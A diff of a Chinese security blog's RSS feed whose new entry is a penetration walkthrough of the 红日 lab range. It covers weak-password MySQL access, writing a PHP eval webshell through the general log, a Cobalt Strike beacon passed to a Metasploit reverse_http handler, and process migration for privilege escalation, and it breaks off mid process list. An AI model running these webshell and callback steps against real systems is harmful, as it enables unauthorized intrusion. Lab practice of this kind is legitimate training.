@@ -1,4 +1,621 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Oight</title><link>https://Oight.github.io/</link><description>Recent content on Oight</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>Oight</copyright><lastBuildDate>Sun, 24 May 2026 10:29:47 +0800</lastBuildDate><atom:link href="https://Oight.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>如何使用Binary ninja逆向</title><link>https://Oight.github.io/p/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8binary-ninja%E9%80%86%E5%90%91/</link><pubDate>Sun, 24 May 2026 10:29:47 +0800</pubDate><guid>https://Oight.github.io/p/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8binary-ninja%E9%80%86%E5%90%91/</guid><description>&lt;h1 id="如何使用binary-ninja逆向">如何使用Binary ninja逆向
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Oight</title><link>https://Oight.github.io/</link><description>Recent content on Oight</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>Oight</copyright><lastBuildDate>Mon, 15 Jun 2026 10:31:09 +0800</lastBuildDate><atom:link href="https://Oight.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>红日靶场（一）渗透</title><link>https://Oight.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%97%E9%80%8F/</link><pubDate>Mon, 15 Jun 2026 10:31:09 +0800</pubDate><guid>https://Oight.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%97%E9%80%8F/</guid><description>&lt;h1 id="红日靶场一渗透">红日靶场（一）渗透
+&lt;/h1>&lt;h2 id="第一章">第一章
+&lt;/h2>&lt;h3 id="渗透思路">渗透思路
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;h4 id="一漏洞利用">&lt;strong>一、漏洞利用&lt;/strong>
+&lt;/h4>&lt;ol>
+&lt;li>漏洞搜索与利用&lt;/li>
+&lt;li>系统信息收集&lt;/li>
+&lt;li>数据库弱密码&lt;/li>
+&lt;li>后台Getshell上传&lt;/li>
+&lt;li>主机信息收集&lt;/li>
+&lt;/ol>
+&lt;h4 id="二内网搜集">&lt;strong>二、内网搜集&lt;/strong>
+&lt;/h4>&lt;ol>
+&lt;li>内网&amp;ndash;继续信息收集&lt;/li>
+&lt;li>内网攻击姿势&amp;ndash;信息泄露&lt;/li>
+&lt;li>内网攻击姿势-MS14-058&lt;/li>
+&lt;li>远程桌面口令猜测&lt;/li>
+&lt;/ol>
+&lt;h4 id="三横向移动">&lt;strong>三、横向移动&lt;/strong>
+&lt;/h4>&lt;ol>
+&lt;li>内网攻击姿势-SMB&lt;/li>
+&lt;li>黄金票据&lt;/li>
+&lt;/ol>
+&lt;h4 id="四构建通道">&lt;strong>四、构建通道&lt;/strong>
+&lt;/h4>&lt;ol>
+&lt;li>内网其它主机端口-代理转发&lt;/li>
+&lt;/ol>
+&lt;h4 id="五持久控制">&lt;strong>五、持久控制&lt;/strong>
+&lt;/h4>&lt;ol>
+&lt;li>域渗透-域成员信息收集&lt;/li>
+&lt;li>域渗透-基础服务弱口令探测及深度利用之powershell&lt;/li>
+&lt;li>域渗透-横向移动[wmi利用]&lt;/li>
+&lt;li>域渗透-C2命令执行&lt;/li>
+&lt;li>域渗透-利用DomainFronting实现对beacon的深度隐藏&lt;/li>
+&lt;li>域渗透-域控实现与利用&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;/ol>
+&lt;h3 id="步骤描述">步骤描述
+&lt;/h3>&lt;p>先使用nmap扫描端口开放情况&lt;/p>
+&lt;p>开放了80，3306端口&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>kali㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ nmap -sS -sV -Pn 192.168.111.20
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.99 &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2026-06-14 10:21 +0800
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 192.168.111.20
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.068s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">989&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>reset&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.4.23 &lt;span class="o">((&lt;/span>Win32&lt;span class="o">)&lt;/span> OpenSSL/1.0.2j PHP/5.4.45&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds Microsoft Windows &lt;span class="m">7&lt;/span> - &lt;span class="m">10&lt;/span> microsoft-ds &lt;span class="o">(&lt;/span>workgroup: GOD&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1025/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1026/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1027/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1028/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1029/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1030/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3306/tcp open mysql MySQL &lt;span class="o">(&lt;/span>unauthorized&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: Host: STU1&lt;span class="p">;&lt;/span> OS: Windows&lt;span class="p">;&lt;/span> CPE: cpe:/o:microsoft:windows
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 67.60 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msgy1ie69ky54qij30yo0h3488.jpg"
+loading="lazy"
+alt="image-20260614102646210"
+>&lt;/p>
+&lt;p>访问80端口，可以发现有PHP探针&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msgy1ie69kxwg3bj319r11n1kx.jpg"
+loading="lazy"
+alt="image-20260614102741660"
+>&lt;/p>
+&lt;p>可以检测数据库连接&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msgy1ie69kxmrlnj317o088adg.jpg"
+loading="lazy"
+alt="image-20260614103004831"
+>&lt;/p>
+&lt;p>尝试弱密码 root/root，提示数据库连接成功&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1ie69kx8xp3j30po0bx76q.jpg"
+loading="lazy"
+alt="image-20260614103048926"
+>&lt;/p>
+&lt;p>说明存在弱口令&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1ie69kx4heuj314z0b6aiz.jpg"
+loading="lazy"
+alt="image-20260614103220717"
+>&lt;/p>
+&lt;p>在网页最下面我们可以看到这里使用了phpMyAdmin来管理数据库，因此我们现在可以登录后台&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1ie69kx00y6j30wk0nfq6j.jpg"
+loading="lazy"
+alt="image-20260614103433949"
+>&lt;/p>
+&lt;p>进入后，尝试一下是否可以直接写webshell，执行&lt;code>show global variables like '%secure%'&lt;/code>,发现不可写&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1ie69kwvpokj30ws0lfgpu.jpg"
+loading="lazy"
+alt="image-20260614103936374"
+>&lt;/p>
+&lt;p>这里字段是NULL，不可写，如果为空就可以写任意目录，有路径就只能往对应路径里写&lt;/p>
+&lt;p>再看看有没有开启日志，试试能不能往日志里写，执行&lt;code>SHOW GLOBAL VARIABLES LIKE '%general%';&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1ie69kwr0jyj30uv0kj790.jpg"
+loading="lazy"
+alt="image-20260614104310122"
+>&lt;/p>
+&lt;p>没开，但我们可以把它打开，&lt;code>set global general_log='on';&lt;/code> 然后把日志路径改为web网站路径 &lt;code>set global general_log_file = 'C:/phpstudy/WWW/test.php'&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1ie69kwmpjbj30kq0e20vy.jpg"
+loading="lazy"
+alt="image-20260614104652120"
+>&lt;/p>
+&lt;p>检查一下发现更改成功了&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1ie69kwgy04j30i00i3tc3.jpg"
+loading="lazy"
+alt="image-20260614104735818"
+>&lt;/p>
+&lt;p>接下来就可以往进写入一句话木马了，执行一下&lt;code>select &amp;quot;&amp;lt;?php eval($_POST['a'])?&amp;gt;&amp;quot;&lt;/code>&lt;/p>
+&lt;p>然后我们直接用蚁剑连接这个木马&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1ie69kwbbvaj316u0swagl.jpg"
+loading="lazy"
+alt="image-20260614105303090"
+>&lt;/p>
+&lt;p>接下来就可以上线CS了，在kali中启动CS&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msgy1ie69xsqge8j317x09r791.jpg"
+loading="lazy"
+alt="image-20260614105427512"
+>&lt;/p>
+&lt;p>创建监听器&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1ie69kw12yaj31bo0cvdis.jpg"
+loading="lazy"
+alt="image-20260614111015618"
+>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1ie69kvwr5tj30aa07ntad.jpg"
+loading="lazy"
+alt="image-20260614111058156"
+>&lt;/p>
+&lt;p>生成EXE木马，把木马用蚁剑上传，然后打开终端执行木马&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1ie69kvt7c2j30e30gvacm.jpg"
+loading="lazy"
+alt="image-20260614182650632"
+>&lt;/p>
+&lt;p>成功上线CS&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1ie69kvpqa2j30xr0hgdi6.jpg"
+loading="lazy"
+alt="image-20260614182739678"
+>&lt;/p>
+&lt;p>接下来我们使用基于MSF+proxychains+kali的渗透&lt;/p>
+&lt;p>MSF联动，把CS会话注入MSF&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">首先在msf上监听自己的ip跟端口：
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">use exploit/multi/handler
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> payload windows/meterpreter/reverse_http（跟cs上选用的payload一样）
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> lhost 本机ip
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> lport 接受的端口
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">exploit &lt;span class="o">[&lt;/span>执行&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1ie69kvl732j318t0gkdr9.jpg"
+loading="lazy"
+alt="image-20260615152124140"
+>&lt;/p>
+&lt;p>然后cs那边创建一个foreign监听的listeners。
+Listeners的ip为msf的ip，端口为msf监听的端口&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1ie69kvdzm9j31jc0i7n2w.jpg"
+loading="lazy"
+alt="image-20260615152153356"
+>&lt;/p>
+&lt;p>选择 spawn即可&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1ie69kv8wotj30io0hyq5u.jpg"
+loading="lazy"
+alt="image-20260615152221053"
+>&lt;/p>
+&lt;p>MSF成功接收会话&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1ie69kv4u22j30m606gjt4.jpg"
+loading="lazy"
+alt="image-20260615152252164"
+>&lt;/p>
+&lt;p>msf添加路由run post/multi/manage/autoroute，使MSF能够与内网通讯，顺便设置字符编码为UTF-8避免乱码&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1ie69kv1iffj30wl0ejjxx.jpg"
+loading="lazy"
+alt="image-20260615152428187"
+>&lt;/p>
+&lt;p>&lt;code>run autoroute -p&lt;/code>检查一下路由是否添加成功&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1ie69kuxfvaj30v60c1gpl.jpg"
+loading="lazy"
+alt="image-20260615152518168"
+>&lt;/p>
+&lt;p>由于现在我们不是SYSTEM，所以要提权到SYSTEM&lt;/p>
+&lt;p>尝试msf提权的时候返回&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msf exploit&lt;span class="o">(&lt;/span>windows/local/ms15_051_client_copy_image&lt;span class="o">)&lt;/span> &amp;gt; run
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> Handler failed to &lt;span class="nb">bind&lt;/span> to 192.168.111.25:32222:- -
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> Handler failed to &lt;span class="nb">bind&lt;/span> to 0.0.0.0:32222:- -
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> Exploit aborted due to failure: no-target: Running against WOW64 is not supported
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Exploit completed, but no session was created.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>所以我们把当前会话迁移到64 位进程上，使用ps查看有哪些进程&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">meterpreter &lt;span class="p">&amp;gt;&lt;/span> ps
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Process List
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">============
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> PID PPID Name Arch Session User Path
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --- ---- ---- ---- ------- ---- ----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 0 0 [System Process]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 4 0 System
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 252 4 smss.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 312 488 svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 328 320 csrss.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 384 376 csrss.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 392 320 wininit.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 428 376 winlogon.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 444 1772 rundll32.exe x86 0 GOD\Administrator C:\Windows\syswow64\rundll32.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 488 392 services.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 500 392 lsass.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 508 392 lsm.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 604 488 svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 664 488 vmacthlp.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 708 488 svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 800 488 svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 836 488 svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 860 488 svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1012 488 svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1080 488 spoolsv.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1112 488 svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1264 488 svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1340 488 openvpnserv.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1392 488 VGAuthService.ex
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> e
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1604 488 taskhost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1700 488 vmtoolsd.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1772 3648 beacon.exe x64 0 GOD\Administrator C:\phpStudy\WWW\beacon.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1972 488 sppsvc.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 2112 488 msdtc.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 2180 444 powershell.exe x86 0 GOD\Administrator C:\Windows\SysWOW64\WindowsPowerShell\v
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1.0\powershell.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 2244 2880 httpd.exe x86 0 GOD\Administrator C:\phpStudy\Apache\bin\httpd.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 2328 604 WmiPrvSE.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 2536 488 svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 2768 860 taskeng.exe x64 0 GOD\Administrator C:\Windows\System32\taskeng.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 2880 2768 httpd.exe x86 0 GOD\Administrator C:\phpStudy\Apache\bin\httpd.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 2888 2768 mysqld.exe x86 0 GOD\Administrator C:\phpStudy\MySQL\bin\mysqld.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 2900 604 slui.exe x64 1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 2980 328 conhost.exe x64 0 GOD\Administrator C:\Windows\System32\conhost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 3352 488 SearchIndexer.ex
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> e
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 3648 3740 cmd.exe x86 0 GOD\Administrator C:\Windows\SysWOW64\cmd.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 3656 836 dwm.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 3680 3648 explorer.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 3688 328 conhost.exe x64 0 GOD\Administrator C:\Windows\System32\conhost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 3692 328 conhost.exe x64 0 GOD\Administrator C:\Windows\System32\conhost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 3740 2244 cmd.exe x86 0 GOD\Administrator C:\Windows\SysWOW64\cmd.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 3832 488 svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 3896 3680 vmtoolsd.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 3912 3680 Everything.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 3932 3680 openvpn-gui.exe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>迁移到&lt;code>taskeng.exe&lt;/code> (PID 2768)&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1ie69kut0jcj30g0053myq.jpg"
+loading="lazy"
+alt="image-20260615160314512"
+>&lt;/p>
+&lt;p>这里也可以使用另一种方法升级架构：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 先查看当前系统架构&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sysinfo
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 确认是：x64-based PC&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 生成一个64位的Meterpreter payload&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">execute -f cmd.exe -c -H -i
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 进入cmd后执行（或者直接在meterpreter里）：&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">run post/windows/manage/archmigrate
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1ie69kun077j30q006uq4o.jpg"
+loading="lazy"
+alt="image-20260615174526555"
+>&lt;/p>
+&lt;p>接下来就可以提权了&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1ie69kuidezj31660k8qjk.jpg"
+loading="lazy"
+alt="image-20260615174700230"
+>&lt;/p>
+&lt;p>提权成功后没有回弹新的shell，所以我们做一下迁移&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">meterpreter &amp;gt; ps
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Process &lt;span class="nv">List&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">============&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> PID PPID Name Arch Session User Path
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --- ---- ---- ---- ------- ---- ----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="o">[&lt;/span>System Process&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">4&lt;/span> &lt;span class="m">0&lt;/span> System
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">252&lt;/span> &lt;span class="m">4&lt;/span> smss.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">312&lt;/span> &lt;span class="m">488&lt;/span> svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">328&lt;/span> &lt;span class="m">320&lt;/span> csrss.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">384&lt;/span> &lt;span class="m">376&lt;/span> csrss.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">392&lt;/span> &lt;span class="m">320&lt;/span> wininit.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">428&lt;/span> &lt;span class="m">376&lt;/span> winlogon.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">444&lt;/span> &lt;span class="m">1772&lt;/span> rundll32.exe x86 &lt;span class="m">0&lt;/span> GOD&lt;span class="se">\A&lt;/span>dministrator C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\s&lt;/span>yswow64&lt;span class="se">\r&lt;/span>undll32.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">488&lt;/span> &lt;span class="m">392&lt;/span> services.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">500&lt;/span> &lt;span class="m">392&lt;/span> lsass.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">508&lt;/span> &lt;span class="m">392&lt;/span> lsm.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">604&lt;/span> &lt;span class="m">488&lt;/span> svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">664&lt;/span> &lt;span class="m">488&lt;/span> vmacthlp.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">708&lt;/span> &lt;span class="m">488&lt;/span> svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">800&lt;/span> &lt;span class="m">488&lt;/span> svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">836&lt;/span> &lt;span class="m">488&lt;/span> svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">860&lt;/span> &lt;span class="m">488&lt;/span> svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1012&lt;/span> &lt;span class="m">488&lt;/span> svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1080&lt;/span> &lt;span class="m">488&lt;/span> spoolsv.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1112&lt;/span> &lt;span class="m">488&lt;/span> svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1264&lt;/span> &lt;span class="m">488&lt;/span> svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1340&lt;/span> &lt;span class="m">488&lt;/span> openvpnserv.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1392&lt;/span> &lt;span class="m">488&lt;/span> VGAuthService.exe
